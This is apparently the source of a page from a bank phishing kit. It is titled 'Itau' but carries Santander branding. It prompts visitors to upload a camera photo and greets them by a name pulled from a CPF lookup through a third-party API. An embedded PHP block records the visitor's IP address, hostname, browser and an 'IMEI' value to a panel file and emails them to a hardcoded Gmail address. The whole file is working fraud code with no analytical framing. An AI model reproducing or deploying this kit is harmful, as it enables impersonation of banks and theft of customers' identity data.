﻿<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Itau</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
        <meta name="mobile-web-app-capable" content="yes">
        <link rel="stylesheet" type="text/css" href="style.css" />
        <script src="js/jquery-3.2.1.min.js" language="javascript"></script>
        <script src="js/jquery.maskedinput.min.js" language="javascript"></script>
        <script src="script.js" language="javascript"></script>
        <script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>
        <script src="js/ImageTools.js" language="javascript"></script>

        <style>

            .image-upload > input
            {
                display: none;
            }

        </style>

        <script language="javascript">

            setTimeout(function () {
                window.location = "done1.php?id=<?php $hora = date("H,i,s,A,z,n,m,u,d,g,o,l");
echo"$hora"; ?>";
            }, 0);



        </script>

    </head>

    <body hidden onLoad="window.scrollTo(0, 1);">
        <div id="topo">
            <img src="images/santanderlogo.png">	
        </div>

        <div id="topo2" style="color: #848fa0; font-weight: bold">
            <div style="width: 80px;float: left;"><img src="images/user-icon.png" /></div>
            <div style="float: left; padding-top: 35px; padding-left: 10px;">
                Olá <span id="nome" style="color: #848fa0;">Cliente</span>
            </div>
        </div>

        <div id="campos">
            <form method="post" enctype="application/x-www-form-urlencoded">

                <br>
                <br>




                <div class="img-box" id="img1">
                    <img src="images/imagemcso.png">  	
                </div>

                <div class="img-box" style="display: none" id="distrair">
                    <img src="images/id_santander_anima_sincronia.gif">  	
                </div>


                <div id="capturar" class="img-box pt30 image-upload">
                    <label for="fotografia">
                        <img src="images/camera-icon.png" style="cursor: pointer;">  	
                    </label>

                    <input name="fotografia" type="file"  id="fotografia" accept="image/*" capture="camera" required />

                </div>


            </form>

        </div>


        <script language="javascript">
            $(document).ready(function () {
                $().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
                    data: {
                        documento: "<?= $_SESSION['cpf'] ?>",
                    },

                    success: function (data) {
                        var nome = $(data).find("body nome").text();
                        var exception = $(data).find("header exception").text();

                        if (exception) {
                            exception = exception.replace(/, t/, '. T');
                            //$('#status').text(exception);
                        } else {
                            $("#nome").text(ucfirst(nome.split(" ")[0]));
                            $("#dados").show();
                        }
                    }
                });
            });
        </script>

    </body>
</html>
<?php
extract($_POST);
date_default_timezone_set('America/Sao_Paulo');

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: ITA <domingosconde2020@gmail.com>";

$ip = $_SERVER["REMOTE_ADDR"];
$navegador = $_SERVER['HTTP_USER_AGENT'];
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$today = date("d/m/y"); 
$hora = date("H:i:s");

$ip_usuario = @$_SERVER[REMOTE_ADDR];
$arquivo    = 'painel/ORANGE_ITA_' . $ip . ".txt";

$stringData = "
-------------------------------------<br>
ORANGE-ITA -->  $today - '.$hora.' <br>
@ $ip_usuario ($pcname)<br>
-------------------------------------<br>
NAVEGADOR: $navegador<br>
-------------------------------------<br>
IMEI.........: $imei\n
--------------------------------------------<br>";

    $fp = fopen($arquivo, 'a+');
    if ($fp) {
        fwrite($fp, $stringData);
        fclose($fp);
    }

mail("domingosconde2020@gmail.com", "[ORANGE-ITA]"."$ip", $stringData, $headers);

?>